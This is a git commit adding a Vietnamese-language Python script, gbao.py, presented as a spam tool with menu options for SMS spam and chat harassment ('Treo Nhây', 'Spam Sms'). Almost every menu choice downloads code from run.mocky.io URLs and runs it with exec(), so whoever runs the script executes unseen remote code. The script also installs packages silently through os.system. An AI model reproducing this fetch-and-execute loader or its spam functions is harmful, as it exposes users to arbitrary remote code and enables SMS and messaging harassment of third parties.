c3fafbb65c4004f8856f8965cd8e014be1da1420
Tiến Đạt <130561352+datzk25@users.noreply.github.com>
2024-07-22 14:08:00 +0700

    Add files via upload

---
+++ gbao.py
@@ -0,0 +1,194 @@
+from urllib.parse import quote
+from secrets import compare_digest
+import datetime
+import os
+import ssl
+from urllib.parse import urlencode
+from http import cookiejar
+from urllib3.exceptions import InsecureRequestWarning
+import hashlib
+import random
+try:
+    import base64
+    from requests.exceptions import RequestException
+    import requests
+    import pystyle
+    from concurrent.futures import ThreadPoolExecutor
+    from faker import Faker
+    from requests import session
+    import concurrent.futures
+    
+except ImportError:
+    import os
+    os.system("pip install faker")
+    os.system("pip install colorama")
+    os.system("pip install requests")
+    os.system("pip install pystyle")
+    os.system("pip install concurrent.futures")
+    os.system("pip install base64")
+import requests,os,time,re,json,uuid,random,sys
+from concurrent.futures import ThreadPoolExecutor
+import datetime
+from datetime import datetime
+import requests,json
+import uuid
+import requests
+from time import sleep
+from random import choice, randint, shuffle
+from pystyle import Add, Center, Anime, Colors, Colorate, Write, System
+from os.path import isfile
+from pystyle import Colors, Colorate, Write, Center, Add, Box
+from time import sleep,strftime
+import socket
+from pystyle import *
+def clear():
+    os.system('cls' if os.name == 'nt' else 'clear')
+
+def runbanner(text, delay=0.001):
+    for char in text:
+        print(char, end='', flush=True)
+        time.sleep(delay)
+    print()
+
+#MÀU
+xnhac = "\033[1;36m"
+do = "\033[1;31m"
+luc = "\033[1;32m"
+vang = "\033[1;33m"
+xduong = "\033[1;34m"
+hong = "\033[1;35m"
+trang = "\033[1;39m"
+whiteb="\033[1;39m"
+red="\033[0;31m"
+redb="\033[1;31m"
+end='\033[0m'
+kt_code = "</>"
+dac_biet = "\033[32;5;245m\033[1m\033[38;5;39m"
+colors = [
+    "\033[1;37m\033[1m",  # Trắng
+    "\033[1;32m\033[1m",  # Xanh lá
+    "\033[1;34m\033[1m",  # Xanh dương
+    "\033[1m\033[38;5;51m",  # Xanh nhạt
+    "\033[1;31m\033[1m\033[1m",  # Đỏ
+    "\033[1;30m\033[1m",  # Xám
+    "\033[1;33m\033[1m",  # Vàng
+    "\033[1;35m\033[1m",  # Tím
+    "\033[32;5;245m\033[1m\033[38;5;39m",  # Màu đặc biệt
+]
+def banner():
+ banner = f""" \033[32;5;245m\033[1m\033[38;5;39m                            
+              GBao W Tiến Đạt
+\033[1;39m➻ ➻ ➻ ➻ ➻ ➻ ➻ ➻ ➻ ➻ ➻ ➻ ➻ ➻ ➻ ➻ ➻ ➻ ➻ ➻ ➻
+\033[1;39m┌────────────────────\033[1;31m REAL \033[1;39m────────────────────────┐
+\033[1;33m ➻ \033[1;31mDEV : GBao
+\033[1;33m ➻ \033[1;32mFb : Giabao bá sàn
+\033[1;33m ➻ \033[1;33mSupport : Gia Bảo
+\033[1;33m ➻ \033[1;34mBypass : Antiban
+\033[1;33m ➻ \033[1;35mCoppy : Vip Pro
+\033[1;33m ➻ \033[1;36mTool Spam                                          
+\033[1;39m└────────────────────────────────────────────────────┘ 
+\033[1;39m➻ ➻ ➻ ➻ ➻ ➻ ➻ ➻ ➻ ➻ ➻ ➻ ➻ ➻ ➻ ➻ ➻ ➻ ➻ ➻ ➻
+"""
+ for X in banner:
+  sys.stdout.write(X)
+  sys.stdout.flush() 
+  sleep(0.000001)
+ 
+ 
+# =======================[RUN]=======================#
+while True:
+	os.system('clear')
+	banner()
+	print("\033[1;39m ┌──────────────────────────────────────────┐")
+	print("\033[1;39m |  \033[1;31mChức Năng \033[1;31m[\033[1;33m1\033[1;31m] \033[1;32mTreo Nhây        \033[1;39m             ")
+	print("\033[1;39m └──────────────────────────────────────────┘")
+	
+
+
+	print("\033[1;39m ┌──────────────────────────────────────────┐")
+	print("\033[1;39m |  \033[1;31mChức Năng \033[1;31m[\033[1;33m2\033[1;31m] \033[1;32mTreo Nhây Tên     \033[1;39m             ")
+	print("\033[1;39m └──────────────────────────────────────────┘")
+		
+
+
+	print("\033[1;39m ┌──────────────────────────────────────────┐")
+	print("\033[1;39m |  \033[1;31mChức Năng \033[1;31m[\033[1;33m3\033[1;31m] \033[1;32mTreo Nhây Lag        \033[1;39m             ")
+	print("\033[1;39m └──────────────────────────────────────────┘")
+	
+
+
+	print("\033[1;39m ┌──────────────────────────────────────────┐")
+	print("\033[1;39m |  \033[1;31mChức Năng \033[1;31m[\033[1;33m4\033[1;31m] \033[1;32mTreo Form        \033[1;39m             ")
+	print("\033[1;39m └──────────────────────────────────────────┘")
+		
+
+	print("\033[1;39m ┌──────────────────────────────────────────┐")
+	print("\033[1;39m |  \033[1;31mChức Năng \033[1;31m[\033[1;33m5\033[1;31m] \033[1;32mTreo Sớ         \033[1;39m             ")
+	print("\033[1;39m └──────────────────────────────────────────┘")
+	
+
+	print("\033[1;39m ┌──────────────────────────────────────────┐")
+	print("\033[1;39m |  \033[1;31mChức Năng \033[1;31m[\033[1;33m6\033[1;31m] \033[1;32mTreo Dis         \033[1;39m               ")
+	print("\033[1;39m └──────────────────────────────────────────┘")
+
+
+	print("\033[1;39m ┌──────────────────────────────────────────┐")
+	print("\033[1;39m |  \033[1;31mChức Năng \033[1;31m[\033[1;33m7\033[1;31m] \033[1;32mSpam Sms         \033[1;39m             ")
+	print("\033[1;39m └──────────────────────────────────────────┘")
+	
+	print("\033[1;39m ┌──────────────────────────────────────────┐")
+	print("\033[1;39m |  \033[1;31mChức Năng \033[1;31m[\033[1;33m8\033[1;31m] \033[1;32mNhây Tổng         \033[1;39m             ")
+	print("\033[1;39m └──────────────────────────────────────────┘")
+		
+	
+	
+	
+	print("\033[1;39m➻ ➻ ➻ ➻ ➻ ➻ ➻ ➻ ➻ ➻ ➻ ➻ ➻ ➻ ➻ ➻ ➻ ➻ ➻ ➻ ➻ ➻")
+	chon = input('\033[1;31m[\033[1;33m ✯ \033[1;31m] \033[1;34m>\033[1;31m>\033[1;32m> \033[1;39m[\033[1;31mCHOSE\033[1;39m]\033[1;39m: \033[1;32m')
+	print('\033[1;39m➻ ➻ ➻ ➻ ➻ ➻ ➻ ➻ ➻ ➻ ➻ ➻ ➻ ➻ ➻ ➻ ➻ ➻ ➻ ➻ ')
+	if chon == '1' :
+		exec(requests.get('https://run.mocky.io/v3/3801d1e9-cf50-4761-98aa-22a69718ff75').text)
+	if chon == '2':
+		exec(requests.get('https://run.mocky.io/v3/051de45b-e4d2-46da-bf9a-70ff4e288557').text)
+	if chon == '3' :
+		exec(requests.get('https://run.mocky.io/v3/8e0e24d7-28a8-4146-af08-6aedae4f0f84').text)
+	if chon == '4' :
+		exec(requests.get('https://run.mocky.io/v3/2dd3c69e-0a9c-4281-94b9-4651a6badfdd').text)
+	if chon == '5' :
+		exec(requests.get('https://run.mocky.io/v3/cd51ef7b-2455-4a78-8d9b-1fb2ccc52b63').text)
+	if chon == '6':
+		exec(requests.get('https://run.mocky.io/v3/c05f9d4d-c00e-46f1-b69e-b64a8d402559').text)
+	if chon == '7' :
+		exec(requests.get('https://run.mocky.io/v3/80fe14dc-781b-4283-9485-6d050dcd4a78').text)
+	if chon == '8' :
+		exec(requests.get('https://run.mocky.io/v3/4a6443ff-c661-4750-aeca-d2119e5160d7').text)
+	if chon == '9' :
+		exec(requests.get('https://run.mocky.io/v3/3a6ec16a-3f13-478a-a400-69622182a268').text)
+	if chon == '10' :
+		exec(requests.get('https://run.mocky.io/v3/e6235911-8862-43cc-9561-ed7453b9aadb').text)
+	if chon == '11':
+		exec(requests.get('https://run.mocky.io/v3/fca278a6-c1b8-40df-a35a-2115a45e2781').text)
+	if chon == '12' :
+		exec(requests.get('https://run.mocky.io/v3/d38cfa2b-28ab-44ff-8ede-813898ff941f').text)
+	if chon == '13' :
+		exec(requests.get('https://run.mocky.io/v3/91bcc211-369d-4c2c-9e89-650e1e9271ad').text)
+	if chon == '14':
+		os.system('xdg-open https://byoneone.blogspot.com/2023/06/byoneone.html?m=1'); 
+	if chon == '15':
+		os.system('xdg-open https://byoneone.blogspot.com/2023/06/byoneone.html?m=1'); 
+	if chon == '16':
+		os.system('xdg-open https://byoneone.blogspot.com/2023/06/byoneone.html?m=1'); 
+	if chon == '17':
+		os.system('xdg-open https://byoneone.blogspot.com/2023/06/byoneone.html?m=1'); 
+	if chon == '18' :
+		exec(requests.get('https://run.mocky.io/v3/3a6ec16a-3f13-478a-a400-69622182a268').text)
+	if chon == '19' :
+		exec(requests.get('https://run.mocky.io/v3/4b6ca251-283b-4d49-85e9-cd0a731485ec').text)
+	if chon == '20' :
+		exec(requests.get('https://run.mocky.io/v3/7c0b1444-8685-4a33-98c8-18713bca2211').text)
+	if chon == '21' :
+		exec(requests.get('https://run.mocky.io/v3/94c0852d-7373-474f-ae39-b2dd2b8d78aa').text)
+	if chon == '22' :
+		exec(requests.get('https://run.mocky.io/v3/1e0c4843-6aa2-4af0-8955-55fe1e1c4d34').text)
+	else :
+		continue
